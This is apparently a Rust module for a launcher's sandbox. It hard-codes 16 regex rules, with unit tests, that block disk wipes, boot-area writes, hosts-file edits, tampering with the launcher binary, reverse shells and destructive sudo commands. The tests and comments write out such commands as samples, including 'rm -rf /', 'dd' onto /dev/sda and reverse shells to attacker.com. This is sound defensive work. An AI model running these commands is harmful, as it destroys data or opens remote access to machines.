//! L2 硬红线规则 —— 编译期硬编码，无任何 API 可在运行时修改。
//!
//! 设计原则（不可改动）：
//! 1. `REDLINES` 静态变量保存全部 16 条规则；只读、无 setter。
//! 2. 公共 API 只有 `redlines()` / `check()` —— **绝不**暴露 mut 引用。
//! 3. 任何新增/删除规则必须通过修改本文件 + 编译，无法通过配置或前端命令绕过。
//!
//! 16 条规则分布（6 大类别）：
//! - DiskWipe (5):       rm -rf /, rm -rf /*, format C:, cipher /w:C:, dd if=/dev/zero of=/dev/sda
//! - BootCritical (3):   /boot/*, /EFI/*, bootrec /fixmbr
//! - HostsFile (2):      /etc/hosts 写, C:\Windows\System32\drivers\etc\hosts 写
//! - LauncherSelf (1):   写 cc-launcher.exe / cc-switch.app 自身二进制
//! - ReverseShell (2):   bash -i >& /dev/tcp/..., nc -e /bin/sh
//! - SudoDestructive (3): sudo rm, sudo chmod 777 /, sudo dd of=/dev/
//!
//! 共计 5+3+2+1+2+3 = 16 ✓

use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};

/// L2 规则分类（与前端 contracts.ts L2Redline.category 严格对齐）。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum L2Category {
    DiskWipe,
    BootCritical,
    HostsFile,
    LauncherSelf,
    ReverseShell,
    SudoDestructive,
}

impl L2Category {
    /// 序列化为前端使用的字符串值。
    pub fn as_str(self) -> &'static str {
        match self {
            L2Category::DiskWipe => "DiskWipe",
            L2Category::BootCritical => "BootCritical",
            L2Category::HostsFile => "HostsFile",
            L2Category::LauncherSelf => "LauncherSelf",
            L2Category::ReverseShell => "ReverseShell",
            L2Category::SudoDestructive => "SudoDestructive",
        }
    }
}

/// 匹配方式：编译期固定为 regex，便于安全地适配 CLI 的多变输入形态。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MatchType {
    Regex,
}

impl MatchType {
    pub fn as_str(self) -> &'static str {
        "regex"
    }
}

/// 红线条目 —— 静态编译期数据，运行时只读。
pub struct L2Redline {
    pub id: &'static str,
    pub category: L2Category,
    pub pattern_src: &'static str,
    pub pattern: Regex,
    /// 三语描述键，前端通过 i18n 加载具体文案。
    pub description_key: &'static str,
}

/// 命中结果：包含规则元信息 + 实际匹配到的子串。
#[derive(Debug, Clone)]
pub struct L2Match {
    pub id: &'static str,
    pub category: &'static str,
    pub description_key: &'static str,
    pub evidence: String,
}

/// 全部 16 条 L2 硬编码红线。
///
/// **不允许**在源码以外的地方插入/修改这个 list。任何"动态添加规则"的需求
/// 都意味着安全边界被打破 —— 应该通过 PR 修改本文件。
static REDLINES: Lazy<Vec<L2Redline>> = Lazy::new(|| {
    let entries: [(&'static str, L2Category, &'static str, &'static str); 16] = [
        // ── DiskWipe (5) ───────────────────────────────────────────────
        (
            "disk_wipe.rm_root",
            L2Category::DiskWipe,
            // rm -rf / | rm -fr / （尾部允许 /）；阻止裸根擦除
            r"(?i)\brm\s+-[a-z]*r[a-z]*f[a-z]*\s+/\s*$|\brm\s+-[a-z]*f[a-z]*r[a-z]*\s+/\s*$",
            "sandbox.l2.disk_wipe.rm_root",
        ),
        (
            "disk_wipe.rm_root_star",
            L2Category::DiskWipe,
            // rm -rf /* （通配整盘）
            r"(?i)\brm\s+-[a-z]*r[a-z]*f[a-z]*\s+/\*|\brm\s+-[a-z]*f[a-z]*r[a-z]*\s+/\*",
            "sandbox.l2.disk_wipe.rm_root_star",
        ),
        (
            "disk_wipe.format_drive",
            L2Category::DiskWipe,
            // format C: / format c:\ / mkfs.* / wipefs
            // 注：尾随的 \b 在以 `:` 结束的字符串上不会触发（: 是非字符），故省略
            r"(?i)(\bformat\s+[a-z]:|\bmkfs\.\w+|\bwipefs\b)",
            "sandbox.l2.disk_wipe.format_drive",
        ),
        (
            "disk_wipe.cipher_wipe",
            L2Category::DiskWipe,
            // cipher /w:C:  —— Windows 自带的整盘擦除工具
            r"(?i)\bcipher\b.*?/w:[a-z]:",
            "sandbox.l2.disk_wipe.cipher_wipe",
        ),
        (
            "disk_wipe.dd_device",
            L2Category::DiskWipe,
            // dd if=/dev/zero of=/dev/sda  (含 nvme/disk/hd 设备)
            r"(?i)\bdd\b.*\bof=/dev/(sd|nvme|disk|hd)\w*",
            "sandbox.l2.disk_wipe.dd_device",
        ),
        // ── BootCritical (3) ───────────────────────────────────────────
        (
            "boot.boot_dir",
            L2Category::BootCritical,
            // 任何写入 /boot/* 的命令；中间允许 source 文件名 / flag
            r"(?i)(\brm\s+-[a-z]*[rf][a-z]*\s+|\bcp\s+|\bmv\s+|\btee\s+(-a\s+)?|\bdd\s+[^|]*\bof=|>\s*|>>\s*)[^|;&]*?/boot(/|\s|$)",
            "sandbox.l2.boot.boot_dir",
        ),
        (
            "boot.efi_dir",
            L2Category::BootCritical,
            // 写入 /EFI/* （ESP 分区）或 /boot/efi
            r"(?i)(\brm\s+-[a-z]*[rf][a-z]*\s+|\bcp\s+|\bmv\s+|\btee\s+(-a\s+)?|\bdd\s+[^|]*\bof=|>\s*|>>\s*)[^|;&]*?/(boot/)?efi(/|\s|$)",
            "sandbox.l2.boot.efi_dir",
        ),
        (
            "boot.bootrec_fixmbr",
            L2Category::BootCritical,
            // Windows: bootrec /fixmbr | /fixboot | /rebuildbcd
            r"(?i)\bbootrec\b.*?/(fixmbr|fixboot|rebuildbcd)",
            "sandbox.l2.boot.bootrec_fixmbr",
        ),
        // ── HostsFile (2) ──────────────────────────────────────────────
        (
            "hosts.unix_write",
            L2Category::HostsFile,
            // 任何对 /etc/hosts 的写动作（重定向 / tee / cp / mv / rm）
            r"(?i)(>|>>|tee\s+(-a\s+)?|cp\s+\S+\s+|mv\s+\S+\s+|rm\s+-[rf]+\s+)\s*(/private)?/etc/hosts\b",
            "sandbox.l2.hosts.unix_write",
        ),
        (
            "hosts.windows_write",
            L2Category::HostsFile,
            // C:\Windows\System32\drivers\etc\hosts 写动作（slash 已被规范化为 /）
            // 允许中间任意非管道字符（含空格 / 任意 source 文件名）
            r"(?i)(>|>>|\bset-content\b|\bout-file\b|\badd-content\b|\bcopy-item\b|\bmove-item\b|\bremove-item\b)[^|;&]*?c:/windows/system32/drivers/etc/hosts",
            "sandbox.l2.hosts.windows_write",
        ),
        // ── LauncherSelf (1) ───────────────────────────────────────────
        (
            "launcher.self_binary",
            L2Category::LauncherSelf,
            // 写/删 cc-launcher.exe 或 cc-switch.app 自身。允许中间任意路径段（含空格）。
            r"(?i)(>\s*|>>\s*|\bcp\s+|\bmv\s+|\brm\s+-[a-z]*[rf][a-z]*\s+|\bdel\s+|\bremove-item\s+|\berase\s+)[^|;&]*?(cc-launcher\.exe|cc-switch\.exe|cc-switch\.app(/[^|;&\s]*)?)",
            "sandbox.l2.launcher.self_binary",
        ),
        // ── ReverseShell (2) ───────────────────────────────────────────
        (
            "revshell.bash_tcp",
            L2Category::ReverseShell,
            // bash -i >& /dev/tcp/host/port  （经典反弹）
            r"(?i)\bbash\b\s+-i\s+>&?\s+/dev/tcp/",
            "sandbox.l2.revshell.bash_tcp",
        ),
        (
            "revshell.nc_e",
            L2Category::ReverseShell,
            // nc -e /bin/sh  / ncat --exec /bin/bash / nc -lpe cmd.exe
            r"(?i)\bn(c|cat)\b[^|;&]*-[a-z]*e[a-z]*\s+(/bin/(ba)?sh|/bin/zsh|cmd\.exe)",
            "sandbox.l2.revshell.nc_e",
        ),
        // ── SudoDestructive (3) ────────────────────────────────────────
        (
            "sudo.rm_destructive",
            L2Category::SudoDestructive,
            // sudo rm -rf  /  ~  *  /usr  /var 等
            r"(?i)\bsudo\s+rm\s+-[a-z]*[rf][a-z]*\s+(/|~|\*|\$home|/usr|/var|/etc|/lib|/bin|/sbin)",
            "sandbox.l2.sudo.rm_destructive",
        ),
        (
            "sudo.chmod_777_root",
            L2Category::SudoDestructive,
            // sudo chmod -R 777 /  —— 摧毁系统权限
            // 注：不能用尾随 \b，因 `/` 后是 EOL 或空格，皆为非词位置 → 边界无效
            r"(?i)\bsudo\s+chmod\s+(-[a-z]*r[a-z]*\s+)?777\s+(/usr|/var|/etc|/lib|/bin|/sbin|/|~)(\s|$|/)",
            "sandbox.l2.sudo.chmod_777_root",
        ),
        (
            "sudo.dd_device",
            L2Category::SudoDestructive,
            // sudo dd of=/dev/...  （盖写设备节点）
            r"(?i)\bsudo\s+dd\b.*\bof=/dev/\w+",
            "sandbox.l2.sudo.dd_device",
        ),
    ];

    entries
        .into_iter()
        .map(|(id, category, pattern_src, description_key)| {
            let pattern = Regex::new(pattern_src).unwrap_or_else(|e| {
                // Panic at startup is acceptable: invalid regex == launcher 完全不能启动
                // 比"运行时悄悄漏过"安全。
                panic!("L2 redline regex compile failed (id={id}): {e}");
            });
            L2Redline {
                id,
                category,
                pattern_src,
                pattern,
                description_key,
            }
        })
        .collect()
});

/// 公共只读访问入口。无 `mut` 变体。
pub fn redlines() -> &'static [L2Redline] {
    REDLINES.as_slice()
}

/// 跨平台命令规范化：
/// - 反斜杠 → 正斜杠（让 Windows / Unix 模式可共用 regex）
/// - 多空格折叠为单空格
/// - 不强制小写，让 regex 自己用 `(?i)` 处理（避免误把 case-sensitive 的部分压平）
pub fn normalize_command(input: &str) -> String {
    let with_slash = input.replace('\\', "/");
    let mut out = String::with_capacity(with_slash.len());
    let mut prev_space = false;
    for ch in with_slash.chars() {
        if ch.is_whitespace() {
            if !prev_space {
                out.push(' ');
            }
            prev_space = true;
        } else {
            out.push(ch);
            prev_space = false;
        }
    }
    out.trim().to_string()
}

/// 主检查入口：返回首条命中的红线（无则返回 None）。
pub fn check(command: &str) -> Option<L2Match> {
    let normalized = normalize_command(command);
    for entry in redlines() {
        if let Some(m) = entry.pattern.find(&normalized) {
            return Some(L2Match {
                id: entry.id,
                category: entry.category.as_str(),
                description_key: entry.description_key,
                // 截断到 200 字符避免日志爆炸 / 前端渲染压力
                evidence: truncate(m.as_str(), 200),
            });
        }
    }
    None
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        let mut end = max;
        // 避免在 UTF-8 字符中间截断
        while end > 0 && !s.is_char_boundary(end) {
            end -= 1;
        }
        format!("{}…", &s[..end])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn redlines_count_is_exactly_sixteen() {
        let list = redlines();
        assert_eq!(
            list.len(),
            16,
            "L2 redline list must contain exactly 16 entries"
        );
    }

    #[test]
    fn redlines_categories_distribution() {
        let list = redlines();
        let count_of = |cat: L2Category| list.iter().filter(|r| r.category == cat).count();
        assert_eq!(count_of(L2Category::DiskWipe), 5, "DiskWipe must be 5");
        assert_eq!(
            count_of(L2Category::BootCritical),
            3,
            "BootCritical must be 3"
        );
        assert_eq!(count_of(L2Category::HostsFile), 2, "HostsFile must be 2");
        assert_eq!(
            count_of(L2Category::LauncherSelf),
            1,
            "LauncherSelf must be 1"
        );
        assert_eq!(
            count_of(L2Category::ReverseShell),
            2,
            "ReverseShell must be 2"
        );
        assert_eq!(
            count_of(L2Category::SudoDestructive),
            3,
            "SudoDestructive must be 3"
        );
    }

    #[test]
    fn redline_ids_are_unique() {
        let list = redlines();
        let mut ids: Vec<&str> = list.iter().map(|r| r.id).collect();
        ids.sort();
        let unique = ids.iter().collect::<std::collections::HashSet<_>>().len();
        assert_eq!(unique, list.len(), "L2 redline ids must be unique");
    }

    // ─── DiskWipe ──────────────────────────────────────────────

    #[test]
    fn rm_root_positive() {
        assert!(check("rm -rf /").is_some());
        assert!(check("rm -fr /").is_some());
        assert!(check("RM -RF /").is_some());
    }

    #[test]
    fn rm_root_negative() {
        assert!(check("rm -rf /home/user/cache").is_none());
        assert!(check("rm -rf ./build").is_none());
    }

    #[test]
    fn rm_root_star_positive() {
        let m = check("rm -rf /*").expect("must match");
        assert_eq!(m.id, "disk_wipe.rm_root_star");
    }

    #[test]
    fn rm_root_star_negative() {
        assert!(check("rm -rf /home/*").is_none());
    }

    #[test]
    fn format_drive_positive() {
        assert!(check("format C:").is_some());
        assert!(check("mkfs.ext4 /dev/sda1").is_some());
        assert!(check("wipefs --all /dev/sdb").is_some());
    }

    #[test]
    fn format_drive_negative() {
        assert!(check("git format-patch HEAD~3").is_none());
    }

    #[test]
    fn cipher_wipe_positive() {
        assert!(check("cipher /w:C:").is_some());
        assert!(check("cipher /W:D:").is_some());
    }

    #[test]
    fn cipher_wipe_negative() {
        assert!(check("cipher /e /a:report.txt").is_none());
    }

    #[test]
    fn dd_device_positive() {
        assert!(check("dd if=/dev/zero of=/dev/sda bs=1M").is_some());
        assert!(check("dd if=/dev/urandom of=/dev/nvme0n1").is_some());
    }

    #[test]
    fn dd_device_negative() {
        assert!(check("dd if=input.bin of=output.bin bs=4K").is_none());
        assert!(check("dd if=/dev/zero of=./scratch.img count=1024").is_none());
    }

    // ─── BootCritical ──────────────────────────────────────────

    #[test]
    fn boot_dir_positive() {
        assert!(check("rm -rf /boot/grub").is_some());
        assert!(check("echo malicious > /boot/initrd").is_some());
        assert!(check("cp evil.img /boot/").is_some());
    }

    #[test]
    fn boot_dir_negative() {
        // 仅当写入操作时才命中，普通字符串引用不命中
        assert!(check("echo bootloader info").is_none());
    }

    #[test]
    fn efi_dir_positive() {
        assert!(check("rm -rf /EFI").is_some());
        assert!(check("cp grub.cfg /boot/efi/EFI/grub/grub.cfg").is_some());
    }

    #[test]
    fn efi_dir_negative() {
        assert!(check("ls /boot/efi/EFI").is_none());
    }

    #[test]
    fn bootrec_fixmbr_positive() {
        assert!(check("bootrec /fixmbr").is_some());
        assert!(check("BOOTREC /FIXBOOT").is_some());
        assert!(check("bootrec /rebuildbcd").is_some());
    }

    #[test]
    fn bootrec_fixmbr_negative() {
        assert!(check("bootrec /?").is_none());
    }

    // ─── HostsFile ─────────────────────────────────────────────

    #[test]
    fn hosts_unix_write_positive() {
        assert!(check("echo 1.2.3.4 evil.com >> /etc/hosts").is_some());
        assert!(check("tee -a /etc/hosts").is_some());
        assert!(check("cp my-hosts /etc/hosts").is_some());
    }

    #[test]
    fn hosts_unix_write_negative() {
        assert!(check("cat /etc/hosts").is_none());
        assert!(check("grep example /etc/hosts").is_none());
    }

    #[test]
    fn hosts_windows_write_positive() {
        // 命令注入了反斜杠 → normalize_command 转成正斜杠后再 match
        assert!(
            check("Set-Content C:\\Windows\\System32\\drivers\\etc\\hosts -Value 'malicious'")
                .is_some()
        );
        assert!(check("Copy-Item evil.txt C:\\Windows\\System32\\drivers\\etc\\hosts").is_some());
    }

    #[test]
    fn hosts_windows_write_negative() {
        assert!(check("Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts").is_none());
    }

    // ─── LauncherSelf ──────────────────────────────────────────

    #[test]
    fn launcher_self_binary_positive() {
        assert!(check("rm -rf /Applications/cc-switch.app").is_some());
        assert!(check("del C:\\Program Files\\cc-launcher.exe").is_some());
        assert!(check("cp evil.exe /Users/bob/cc-launcher.exe").is_some());
    }

    #[test]
    fn launcher_self_binary_negative() {
        // 读取 / 启动不算写入
        assert!(check("./cc-launcher.exe --help").is_none());
        assert!(check("open /Applications/cc-switch.app").is_none());
    }

    // ─── ReverseShell ──────────────────────────────────────────

    #[test]
    fn revshell_bash_tcp_positive() {
        assert!(check("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").is_some());
        assert!(check("bash -i > /dev/tcp/evil/8080").is_some());
    }

    #[test]
    fn revshell_bash_tcp_negative() {
        assert!(check("bash -i").is_none());
        assert!(check("bash -c 'echo hello'").is_none());
    }

    #[test]
    fn revshell_nc_e_positive() {
        assert!(check("nc -e /bin/sh 10.0.0.1 4444").is_some());
        assert!(check("ncat --exec /bin/bash attacker.com 1337").is_some());
        assert!(check("nc -lpe cmd.exe 4444").is_some());
    }

    #[test]
    fn revshell_nc_e_negative() {
        assert!(check("nc -zv localhost 22").is_none());
        assert!(check("ncat -l 4444").is_none());
    }

    // ─── SudoDestructive ───────────────────────────────────────

    #[test]
    fn sudo_rm_destructive_positive() {
        assert!(check("sudo rm -rf /").is_some());
        assert!(check("sudo rm -rf ~").is_some());
        assert!(check("sudo rm -rf /usr/local/bin").is_some());
    }

    #[test]
    fn sudo_rm_destructive_negative() {
        assert!(check("sudo rm /tmp/old-log").is_none());
        assert!(check("sudo rm -rf ./local-build").is_none());
    }

    #[test]
    fn sudo_chmod_777_root_positive() {
        assert!(check("sudo chmod -R 777 /").is_some());
        assert!(check("sudo chmod 777 /usr").is_some());
    }

    #[test]
    fn sudo_chmod_777_root_negative() {
        assert!(check("sudo chmod 644 ~/.ssh/id_rsa").is_none());
        assert!(check("sudo chmod 777 ./scratch").is_none());
    }

    #[test]
    fn sudo_dd_device_positive() {
        assert!(check("sudo dd if=/dev/urandom of=/dev/sda").is_some());
    }

    #[test]
    fn sudo_dd_device_negative() {
        assert!(check("sudo dd if=img.iso of=./out.bin").is_none());
    }

    // ─── Normalization ─────────────────────────────────────────

    #[test]
    fn normalize_collapses_whitespace() {
        assert_eq!(normalize_command("rm    -rf   /"), "rm -rf /");
        assert_eq!(normalize_command("\t rm\t-rf  /\n"), "rm -rf /");
    }

    #[test]
    fn normalize_converts_backslashes() {
        assert_eq!(
            normalize_command("C:\\Windows\\System32"),
            "C:/Windows/System32"
        );
    }

    #[test]
    fn check_returns_none_on_safe_command() {
        assert!(check("ls -la").is_none());
        assert!(check("git status").is_none());
        assert!(check("npm install").is_none());
    }
}
